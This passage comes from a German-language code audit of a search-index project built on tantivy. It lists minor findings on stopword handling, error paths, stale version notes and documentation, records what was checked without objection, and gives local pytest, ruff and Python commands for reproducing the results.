`chain_probe.py:127-162`, rund 45 Zeilen, bewusst dupliziert, weil `scripts/`
kein Paket ist. Die Begründung trägt, der Preis ist sichtbar: der Fehler aus
M-17-02 steht deshalb an zwei Stellen. *Fix:* beide Fundstellen bei M-17-02
zusammen anfassen und im Docstring gegenseitig verlinken.

**L-17-07: Die Begründung gegen die sechste Marke steht gegen E-17-4.**
`backend/src/findling/index/stopwords.py:27-35` verbietet dem Supplement-Digest
den Weg in `expected_versions()` mit dem Argument, eine sechste Marke existiere
auf keiner Bestandsinstallation und löse überall einen Reindex aus. Die Auflage
zu E-17-4 Option a (`17-GRUNDSATZ-ENTSCHEID.md:265-272`) löst genau dieses
Problem für die Sprachmenge über die Saat in `open_store()`. Damit ist das
Verbot nicht falsch, aber es ruht auf einer Prämisse, die die Phase selbst
schon aufgelöst hat, und es ist die Marke, die M-17-04 zur Laufzeit fangen
würde. *Fix:* den Absatz um den Satz ergänzen, dass die Saat den Weg öffnen
würde, und die Entscheidung dagegen mit dem Preis begründen statt mit der
Unmöglichkeit.

**L-17-08: `builtin[language]` ohne Vorgabe.** `scripts/dev/chain_probe.py:367`
greift nach der Sprache, nachdem nur `if builtin:` geprüft wurde; eine
Stoppwortquelle ohne diese Sprache ergibt einen `KeyError` mit Rückverfolgung
statt der sauberen Meldung, die das Werkzeug sonst überall schreibt. Dasselbe
Muster in `stopword_supplement.py:214`, dort allerdings hinter der
Vollständigkeitsprüfung in `:255-258` und damit gedeckt. *Fix:*
`builtin.get(language, [])` mit einer Zeile auf stderr, wenn die Sprache fehlt.

**L-17-09: CLAUDE.md nennt weiter tantivy 0.26.0.** Sechs Stellen
(`CLAUDE.md:36,52,181,234,241,246`) nach dem Pin-Umzug. `:181` behauptet
zusätzlich `cp313t`-Räder; `backend/uv.lock:995-1006` führt für 0.26.2 fünf
Räder und keines davon ist `cp313t`. Ohne Folge für den Bau, weil
`backend/Dockerfile:30` auf `python:3.13-slim-trixie` steht und die beiden
`manylinux_2_17`-Räder passen. *Fix:* die sechs Stellen ziehen und die
Radzeile an `uv.lock` anpassen.

**L-17-10: Die Kommentarchronik der Ratsche wächst.**
`backend/tests/test_measurement_scripts.py:600-660` trägt inzwischen siebzehn
datierte Absätze über vergangene Baumhash-Bewegungen. Der Test bleibt lesbar,
der Kommentar nicht. *Fix:* die Chronik nach `docs/` verschieben und im Test nur
den letzten Umzug mit Verweis stehen lassen.

**L-17-11: docs/language-analyzers.md nennt die Positivliste nicht.** Das neue
Dokument beschreibt die Ketten, aber nicht die geschlossene Sprachmenge und
nicht, warum fünf Sprachen mit Stemmer nicht angeboten werden. *Fix:* einen
Abschnitt mit den dreizehn Namen, den fünf Ausnahmen und dem Verweis auf
`backend/tests/test_language_allowlist.py`.

---

## 7. Was geprueft und nicht beanstandet wurde

Ein Audit, das nur Befunde nennt, lässt offen, was es angesehen hat. Sechs
Punkte mit Beleg.

**Die englische Kette hat sich nicht bewegt.** `test_language_analyzers.py:163`
baut die alte Form von Hand nach und vergleicht 13 Wörter Token für Token,
darunter ein zu langes, ein akzentuiertes, eine Ziffernfolge. `ANALYZER_VERSION`
bleibt bei 1, und das ist richtig: die Fabrik wird von genau einem registrierten
Tokenizer erreicht, und der tokenisiert identisch.

**Die deutsche Kette ist unberührt.** Der Diff an `analyzer.py` fasst
`german_analyzer` nicht an, nur den Kopfkommentar, `english_analyzer` und die
neue Fabrik.

**Der gelockerte Vergleich wirkt wirklich.** `tantivy.__version__` ist in der
installierten Fassung der volle Banner, nicht die nackte Nummer; die Lockerung
ist also kein toter Code hinter grünen Tests mit erfundenen Bannern.

**Die Dichtheitsmessung ist keine Stichprobe.**
`test_language_analyzers.py:597-627` schickt alle 891 eingebauten Einträge der
vier Sprachen in beiden Schreibweisen durch die ausgelieferte Kette und verlangt
jedes Mal die leere Tokenliste.

**Die Ergänzung ist frei von Ballast.** `test_language_analyzers.py:292-311`
verlangt für jeden Eintrag beide Richtungen: die eingebaute Liste fängt ihn
nicht, und er ist seine eigene gefaltete Form.

**uv.lock trägt Prüfsummen.** Der Eintrag für tantivy 0.26.2 führt sdist und
fünf Räder je mit `sha256`; die beiden Linux-Räder decken `x86_64` und
`aarch64` für cp313 ab, was der Mehr-Architektur-Bau braucht.

---

## 8. Wie die Zahlen dieses Berichts nachzumessen sind

```
cd backend
.venv/Scripts/python.exe -m pytest tests/test_language_allowlist.py tests/test_store_repo.py -q
.venv/Scripts/python.exe -m pytest tests/test_measurement_scripts.py tests/test_upgrade_compatibility.py -q
.venv/Scripts/python.exe -m ruff check . ../scripts
.venv/Scripts/python.exe -m ruff format --check . ../scripts
.venv/Scripts/python.exe -m vulture src ../scripts
```

Die Gegenproben dieses Audits, die kein Test des Baums fährt:

```
.venv/Scripts/python.exe -c "import tantivy; print(tantivy.__version__)"
.venv/Scripts/python.exe -c "from findling.index.stopwords import FOLDED_STOPWORDS; \
from findling.config import LANGUAGE_ALLOWLIST; print(sorted(LANGUAGE_ALLOWLIST - set(FOLDED_STOPWORDS)))"
.venv/Scripts/python.exe -c "from findling.index.analyzer import snowball_analyzer as s; \
a=s('french', ()); print(a.analyze('ete'))"
```

Der Endlosschleifenbeleg braucht eine Zeitgrenze, sonst endet er nicht:

```
timeout 30 .venv/Scripts/python.exe -c "import importlib.util, pathlib; \
p=pathlib.Path('../scripts/dev/stopword_supplement.py').resolve(); \
sp=importlib.util.spec_from_file_location('sw',p); m=importlib.util.module_from_spec(sp); \
sp.loader.exec_module(m); m.parse_stopwords('pub const X = &[\"a\"];')"
```
